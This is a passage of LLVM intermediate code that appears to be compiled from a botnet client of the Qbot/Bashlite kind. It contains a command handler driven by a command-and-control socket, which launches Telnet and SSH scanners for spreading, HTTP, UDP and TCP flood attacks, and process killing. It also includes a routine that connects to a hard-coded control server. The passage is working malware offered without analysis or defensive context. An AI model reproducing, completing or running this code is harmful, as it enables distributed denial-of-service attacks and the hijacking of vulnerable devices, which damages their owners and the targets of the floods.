  %48 = getelementptr inbounds i8*, i8** %47, i64 0
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0)) #10
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %484, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* %3, align 4
  %54 = icmp ne i32 %53, 2
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i32 0, i32 0))
  br label %484

; <label>:58:                                     ; preds = %52
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strcmp(i8* %61, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %121, label %64

; <label>:64:                                     ; preds = %58
  %65 = load i32, i32* @scanPid, align 4
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %64
  br label %484

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 %69, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i32 0, i32 0))
  %71 = load i32, i32* @scanPid, align 4
  %72 = call i32 @kill(i32 %71, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @strcmp(i8* %75, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i32 0, i32 0)) #10
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %96, label %78

; <label>:78:                                     ; preds = %68
  %79 = load i32, i32* @scanPid, align 4
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %78
  br label %484

; <label>:82:                                     ; preds = %78
  %83 = call i32 @fork() #2
  store i32 %83, i32* %5, align 4
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %86 = load i32, i32* %5, align 4
  %87 = icmp ugt i32 %86, 0
  br i1 %87, label %88, label %90

; <label>:88:                                     ; preds = %82
  %89 = load i32, i32* %5, align 4
  store i32 %89, i32* @scanPid, align 4
  br label %484

; <label>:90:                                     ; preds = %82
  %91 = load i32, i32* %5, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %90
  br label %484

; <label>:94:                                     ; preds = %90
  br label %95

; <label>:95:                                     ; preds = %94
  call void (i32, ...) bitcast (void ()* @TelnetScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:96:                                     ; preds = %68
  %97 = load i8**, i8*** %4, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @strcmp(i8* %99, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i32 0, i32 0)) #10
  %101 = icmp ne i32 %100, 0
  br i1 %101, label %120, label %102

; <label>:102:                                    ; preds = %96
  %103 = load i32, i32* @scanPid, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %102
  br label %484

; <label>:106:                                    ; preds = %102
  %107 = call i32 @fork() #2
  store i32 %107, i32* %6, align 4
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 %108, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %110 = load i32, i32* %6, align 4
  %111 = icmp ugt i32 %110, 0
  br i1 %111, label %112, label %114

; <label>:112:                                    ; preds = %106
  %113 = load i32, i32* %6, align 4
  store i32 %113, i32* @scanPid, align 4
  br label %484

; <label>:114:                                    ; preds = %106
  %115 = load i32, i32* %6, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %114
  br label %484

; <label>:118:                                    ; preds = %114
  br label %119

; <label>:119:                                    ; preds = %118
  call void (i32, ...) bitcast (void ()* @secureShellScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:120:                                    ; preds = %96
  br label %121

; <label>:121:                                    ; preds = %120, %58
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 0
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @strcmp(i8* %124, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0)) #10
  %126 = icmp ne i32 %125, 0
  br i1 %126, label %175, label %127

; <label>:127:                                    ; preds = %121
  %128 = load i32, i32* %3, align 4
  %129 = icmp slt i32 %128, 3
  br i1 %129, label %136, label %130

; <label>:130:                                    ; preds = %127
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 2
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %130, %127
  br label %484

; <label>:137:                                    ; preds = %130
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  %140 = load i8*, i8** %139, align 8
  store i8* %140, i8** %7, align 8
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  store i32 %144, i32* %8, align 4
  %145 = load i8*, i8** %7, align 8
  %146 = call i8* @strstr(i8* %145, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %147 = icmp ne i8* %146, null
  br i1 %147, label %148, label %165

; <label>:148:                                    ; preds = %137
  %149 = load i8*, i8** %7, align 8
  %150 = call i8* @strtok(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %150, i8** %9, align 8
  br label %151

; <label>:151:                                    ; preds = %162, %148
  %152 = load i8*, i8** %9, align 8
  %153 = icmp ne i8* %152, null
  br i1 %153, label %154, label %164

; <label>:154:                                    ; preds = %151
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %162, label %157

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %7, align 8
  %159 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %158, i32 %159)
  %160 = load i32, i32* @mainCommSock, align 4
  %161 = call i32 @close(i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:162:                                    ; preds = %154
  %163 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %163, i8** %9, align 8
  br label %151

; <label>:164:                                    ; preds = %151
  br label %174

; <label>:165:                                    ; preds = %137
  %166 = call i32 @listFork()
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %165
  br label %484

; <label>:169:                                    ; preds = %165
  %170 = load i8*, i8** %7, align 8
  %171 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %170, i32 %171)
  %172 = load i32, i32* @mainCommSock, align 4
  %173 = call i32 @close(i32 %172)
  call void @_exit(i32 0) #12
  unreachable

; <label>:174:                                    ; preds = %164
  br label %175

; <label>:175:                                    ; preds = %174, %121
  %176 = load i8**, i8*** %4, align 8
  %177 = getelementptr inbounds i8*, i8** %176, i64 0
  %178 = load i8*, i8** %177, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0)) #10
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %298, label %181

; <label>:181:                                    ; preds = %175
  %182 = load i32, i32* %3, align 4
  %183 = icmp slt i32 %182, 6
  br i1 %183, label %229, label %184

; <label>:184:                                    ; preds = %181
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 3
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @atoi(i8* %187) #10
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %229, label %190

; <label>:190:                                    ; preds = %184
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 2
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* %193) #10
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %229, label %196

; <label>:196:                                    ; preds = %190
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 4
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #10
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %229, label %202

; <label>:202:                                    ; preds = %196
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 5
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %229, label %208

; <label>:208:                                    ; preds = %202
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 5
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @atoi(i8* %211) #10
  %213 = icmp sgt i32 %212, 65500
  br i1 %213, label %229, label %214

; <label>:214:                                    ; preds = %208
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 4
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  %219 = icmp sgt i32 %218, 32
  br i1 %219, label %229, label %220

; <label>:220:                                    ; preds = %214
  %221 = load i32, i32* %3, align 4
  %222 = icmp eq i32 %221, 7
  br i1 %222, label %223, label %230

; <label>:223:                                    ; preds = %220
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 6
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  %228 = icmp slt i32 %227, 1
  br i1 %228, label %229, label %230

; <label>:229:                                    ; preds = %223, %214, %208, %202, %196, %190, %184, %181
  br label %484

; <label>:230:                                    ; preds = %223, %220
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 1
  %233 = load i8*, i8** %232, align 8
  store i8* %233, i8** %10, align 8
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 2
  %236 = load i8*, i8** %235, align 8
  %237 = call i32 @atoi(i8* %236) #10
  store i32 %237, i32* %11, align 4
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 3
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #10
  store i32 %241, i32* %12, align 4
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 4
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  store i32 %245, i32* %13, align 4
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 5
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @atoi(i8* %248) #10
  store i32 %249, i32* %14, align 4
  %250 = load i32, i32* %3, align 4
  %251 = icmp eq i32 %250, 7
  br i1 %251, label %252, label %257

; <label>:252:                                    ; preds = %230
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 6
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* %255) #10
  br label %258

; <label>:257:                                    ; preds = %230
  br label %258

; <label>:258:                                    ; preds = %257, %252
  %259 = phi i32 [ %256, %252 ], [ 10, %257 ]
  store i32 %259, i32* %15, align 4
  %260 = load i8*, i8** %10, align 8
  %261 = call i8* @strstr(i8* %260, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %262 = icmp ne i8* %261, null
  br i1 %262, label %263, label %284

; <label>:263:                                    ; preds = %258
  %264 = load i8*, i8** %10, align 8
  %265 = call i8* @strtok(i8* %264, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %265, i8** %16, align 8
  br label %266

; <label>:266:                                    ; preds = %281, %263
  %267 = load i8*, i8** %16, align 8
  %268 = icmp ne i8* %267, null
  br i1 %268, label %269, label %283

; <label>:269:                                    ; preds = %266
  %270 = call i32 @listFork()
  %271 = icmp ne i32 %270, 0
  br i1 %271, label %281, label %272

; <label>:272:                                    ; preds = %269
  %273 = load i8*, i8** %16, align 8
  %274 = load i32, i32* %11, align 4
  %275 = load i32, i32* %12, align 4
  %276 = load i32, i32* %13, align 4
  %277 = load i32, i32* %14, align 4
  %278 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %273, i32 %274, i32 %275, i32 %276, i32 %277, i32 %278)
  %279 = load i32, i32* @mainCommSock, align 4
  %280 = call i32 @close(i32 %279)
  call void @_exit(i32 0) #12
  unreachable

; <label>:281:                                    ; preds = %269
  %282 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %282, i8** %16, align 8
  br label %266

; <label>:283:                                    ; preds = %266
  br label %297

; <label>:284:                                    ; preds = %258
  %285 = call i32 @listFork()
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %288

; <label>:287:                                    ; preds = %284
  br label %484

; <label>:288:                                    ; preds = %284
  %289 = load i8*, i8** %10, align 8
  %290 = load i32, i32* %11, align 4
  %291 = load i32, i32* %12, align 4
  %292 = load i32, i32* %13, align 4
  %293 = load i32, i32* %14, align 4
  %294 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %289, i32 %290, i32 %291, i32 %292, i32 %293, i32 %294)
  %295 = load i32, i32* @mainCommSock, align 4
  %296 = call i32 @close(i32 %295)
  call void @_exit(i32 0) #12
  unreachable

; <label>:297:                                    ; preds = %283
  br label %298

; <label>:298:                                    ; preds = %297, %175
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 0
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @strcmp(i8* %301, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %303 = icmp ne i32 %302, 0
  br i1 %303, label %429, label %304

; <label>:304:                                    ; preds = %298
  %305 = load i32, i32* %3, align 4
  %306 = icmp slt i32 %305, 6
  br i1 %306, label %349, label %307

; <label>:307:                                    ; preds = %304
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 3
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #10
  %312 = icmp eq i32 %311, -1
  br i1 %312, label %349, label %313

; <label>:313:                                    ; preds = %307
  %314 = load i8**, i8*** %4, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 2
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* %316) #10
  %318 = icmp eq i32 %317, -1
  br i1 %318, label %349, label %319

; <label>:319:                                    ; preds = %313
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 4
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %349, label %325

; <label>:325:                                    ; preds = %319
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 4
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #10
  %330 = icmp sgt i32 %329, 32
  br i1 %330, label %349, label %331

; <label>:331:                                    ; preds = %325
  %332 = load i32, i32* %3, align 4
  %333 = icmp sgt i32 %332, 6
  br i1 %333, label %334, label %340

; <label>:334:                                    ; preds = %331
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 6
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* %337) #10
  %339 = icmp slt i32 %338, 0
  br i1 %339, label %349, label %340

; <label>:340:                                    ; preds = %334, %331
  %341 = load i32, i32* %3, align 4
  %342 = icmp eq i32 %341, 8
  br i1 %342, label %343, label %350

; <label>:343:                                    ; preds = %340
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 7
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* %346) #10
  %348 = icmp slt i32 %347, 1
  br i1 %348, label %349, label %350

; <label>:349:                                    ; preds = %343, %334, %325, %319, %313, %307, %304
  br label %484

; <label>:350:                                    ; preds = %343, %340
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 1
  %353 = load i8*, i8** %352, align 8
  store i8* %353, i8** %17, align 8
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 2
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @atoi(i8* %356) #10
  store i32 %357, i32* %18, align 4
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 3
  %360 = load i8*, i8** %359, align 8
  %361 = call i32 @atoi(i8* %360) #10
  store i32 %361, i32* %19, align 4
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 4
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @atoi(i8* %364) #10
  store i32 %365, i32* %20, align 4
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 5
  %368 = load i8*, i8** %367, align 8
  store i8* %368, i8** %21, align 8
  %369 = load i32, i32* %3, align 4
  %370 = icmp eq i32 %369, 8
  br i1 %370, label %371, label %376

; <label>:371:                                    ; preds = %350
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 7
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @atoi(i8* %374) #10
  br label %377

; <label>:376:                                    ; preds = %350
  br label %377

; <label>:377:                                    ; preds = %376, %371
  %378 = phi i32 [ %375, %371 ], [ 10, %376 ]
  store i32 %378, i32* %22, align 4
  %379 = load i32, i32* %3, align 4
  %380 = icmp sgt i32 %379, 6
  br i1 %380, label %381, label %386

; <label>:381:                                    ; preds = %377
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 6
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* %384) #10
  br label %387

; <label>:386:                                    ; preds = %377
  br label %387

; <label>:387:                                    ; preds = %386, %381
  %388 = phi i32 [ %385, %381 ], [ 0, %386 ]
  store i32 %388, i32* %23, align 4
  %389 = load i8*, i8** %17, align 8
  %390 = call i8* @strstr(i8* %389, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %391 = icmp ne i8* %390, null
  br i1 %391, label %392, label %414

; <label>:392:                                    ; preds = %387
  %393 = load i8*, i8** %17, align 8
  %394 = call i8* @strtok(i8* %393, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %394, i8** %24, align 8
  br label %395

; <label>:395:                                    ; preds = %411, %392
  %396 = load i8*, i8** %24, align 8
  %397 = icmp ne i8* %396, null
  br i1 %397, label %398, label %413

; <label>:398:                                    ; preds = %395
  %399 = call i32 @listFork()
  %400 = icmp ne i32 %399, 0
  br i1 %400, label %411, label %401

; <label>:401:                                    ; preds = %398
  %402 = load i8*, i8** %24, align 8
  %403 = load i32, i32* %18, align 4
  %404 = load i32, i32* %19, align 4
  %405 = load i32, i32* %20, align 4
  %406 = load i8*, i8** %21, align 8
  %407 = load i32, i32* %23, align 4
  %408 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %402, i32 %403, i32 %404, i32 %405, i8* %406, i32 %407, i32 %408)
  %409 = load i32, i32* @mainCommSock, align 4
  %410 = call i32 @close(i32 %409)
  call void @_exit(i32 0) #12
  unreachable

; <label>:411:                                    ; preds = %398
  %412 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %412, i8** %24, align 8
  br label %395

; <label>:413:                                    ; preds = %395
  br label %428

; <label>:414:                                    ; preds = %387
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %414
  br label %484

; <label>:418:                                    ; preds = %414
  %419 = load i8*, i8** %17, align 8
  %420 = load i32, i32* %18, align 4
  %421 = load i32, i32* %19, align 4
  %422 = load i32, i32* %20, align 4
  %423 = load i8*, i8** %21, align 8
  %424 = load i32, i32* %23, align 4
  %425 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %419, i32 %420, i32 %421, i32 %422, i8* %423, i32 %424, i32 %425)
  %426 = load i32, i32* @mainCommSock, align 4
  %427 = call i32 @close(i32 %426)
  call void @_exit(i32 0) #12
  unreachable

; <label>:428:                                    ; preds = %413
  br label %429

; <label>:429:                                    ; preds = %428, %298
  %430 = load i8**, i8*** %4, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 0
  %432 = load i8*, i8** %431, align 8
  %433 = call i32 @strcmp(i8* %432, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #10
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %476, label %435

; <label>:435:                                    ; preds = %429
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  br label %436

; <label>:436:                                    ; preds = %462, %435
  %437 = load i64, i64* %26, align 8
  %438 = load i64, i64* @numpids, align 8
  %439 = icmp ult i64 %437, %438
  br i1 %439, label %440, label %465

; <label>:440:                                    ; preds = %436
  %441 = load i32*, i32** @pids, align 8
  %442 = load i64, i64* %26, align 8
  %443 = getelementptr inbounds i32, i32* %441, i64 %442
  %444 = load i32, i32* %443, align 4
  %445 = icmp ne i32 %444, 0
  br i1 %445, label %446, label %461

; <label>:446:                                    ; preds = %440
  %447 = load i32*, i32** @pids, align 8
  %448 = load i64, i64* %26, align 8
  %449 = getelementptr inbounds i32, i32* %447, i64 %448
  %450 = load i32, i32* %449, align 4
  %451 = call i32 @getpid() #2
  %452 = icmp ne i32 %450, %451
  br i1 %452, label %453, label %461

; <label>:453:                                    ; preds = %446
  %454 = load i32*, i32** @pids, align 8
  %455 = load i64, i64* %26, align 8
  %456 = getelementptr inbounds i32, i32* %454, i64 %455
  %457 = load i32, i32* %456, align 4
  %458 = call i32 @kill(i32 %457, i32 9) #2
  %459 = load i32, i32* %25, align 4
  %460 = add nsw i32 %459, 1
  store i32 %460, i32* %25, align 4
  br label %461

; <label>:461:                                    ; preds = %453, %446, %440
  br label %462

; <label>:462:                                    ; preds = %461
  %463 = load i64, i64* %26, align 8
  %464 = add i64 %463, 1
  store i64 %464, i64* %26, align 8
  br label %436

; <label>:465:                                    ; preds = %436
  %466 = load i32, i32* %25, align 4
  %467 = icmp sgt i32 %466, 0
  br i1 %467, label %468, label %472

; <label>:468:                                    ; preds = %465
  %469 = load i32, i32* @mainCommSock, align 4
  %470 = load i32, i32* %25, align 4
  %471 = call i32 (i32, i8*, ...) @sockprintf(i32 %469, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i32 %470)
  br label %475

; <label>:472:                                    ; preds = %465
  %473 = load i32, i32* @mainCommSock, align 4
  %474 = call i32 (i32, i8*, ...) @sockprintf(i32 %473, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  br label %475

; <label>:475:                                    ; preds = %472, %468
  br label %476

; <label>:476:                                    ; preds = %475, %429
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 0
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @strcmp(i8* %479, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i32 0, i32 0)) #10
  %481 = icmp ne i32 %480, 0
  br i1 %481, label %483, label %482

; <label>:482:                                    ; preds = %476
  call void @exit(i32 0) #14
  unreachable

; <label>:483:                                    ; preds = %476
  br label %484

; <label>:484:                                    ; preds = %483, %417, %349, %287, %229, %168, %136, %117, %112, %105, %93, %88, %81, %67, %55, %46, %41, %32
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 46, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
